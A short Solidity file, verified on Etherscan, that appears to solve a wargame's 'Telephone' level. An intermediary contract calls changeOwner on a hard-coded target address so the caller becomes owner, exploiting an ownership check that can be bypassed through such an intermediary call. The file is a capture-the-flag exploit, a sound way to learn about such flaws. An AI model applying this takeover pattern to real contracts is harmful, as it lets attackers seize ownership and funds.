/**
 *Submitted for verification at Etherscan.io on 2021-11-17
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;


contract Telephone {
    function changeOwner(address _owner) public {}
}

contract ChangeOwner {
    Telephone public originalContract = Telephone(0x283316d3528b89f4B28940B172Bf0Fd1b024fc80); 
    
    function execute() public {
        originalContract.changeOwner(msg.sender);
    }
}